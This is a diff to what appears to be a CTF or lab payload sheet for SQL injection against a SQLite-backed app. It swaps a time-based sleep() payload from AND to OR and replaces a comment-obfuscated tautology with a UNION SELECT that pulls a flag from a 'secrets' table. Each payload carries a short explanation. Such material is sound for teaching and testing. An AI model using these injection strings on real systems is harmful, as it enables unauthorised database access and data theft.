@@ -56,7 +56,7 @@ admin' AND 1=0--
 Goal: Delay server response (Database Sleep).
 Payload:
 ```
-' AND sleep(3)--
+' OR sleep(3)--
 ```
 
 Explanation: Uses sleep() function (injected via python into SQLite) to delay 3 seconds.
@@ -66,7 +66,7 @@ Explanation: Uses sleep() function (injected via python into SQLite) to delay 3 
 Goal: Bypass Space character filter.
 Payload:
 ```
-1/**/OR/**/1=1
+1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets
 ```
 
 Explanation: Uses SQL comments /**/ instead of spaces.
